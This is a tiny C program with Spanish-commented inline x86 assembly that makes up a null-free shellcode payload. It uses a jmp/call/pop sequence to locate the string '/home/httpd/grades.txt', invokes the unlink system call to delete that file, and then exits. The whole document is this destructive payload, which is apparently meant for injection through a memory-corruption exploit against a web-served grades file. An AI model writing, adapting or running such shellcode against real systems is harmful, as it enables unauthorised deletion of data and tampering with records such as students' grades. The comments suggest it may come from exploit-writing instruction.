void main(){
__asm__("\n"
	"jmp fee\n"
"foo:\n"
        "popl   %esi\n" // ponemos la direccion del string en %esi 
	"xorl	%eax, %eax\n" //  0 en %eax
	"movb   %al,0x16(%esi)\n" // caracter nulo al final del string
        "movb   $0xb,%al\n" // cargamos el codigo para llamar a unlink mediant int $0x80 (10)
	"decb %al\n"
        "movl   %esi,%ebx\n" // cargamos el argumento (el archivo a eliminar) 
        "int    $0x80\n"
	"xorl	%ebx,%ebx\n"
        "movl   %ebx, %eax\n"
        "inc    %eax\n"
        "int    $0x80\n"
"fee:\n"
	"call foo\n"
        ".string \"/home/httpd/grades.txt\"\n"
"\n");
}
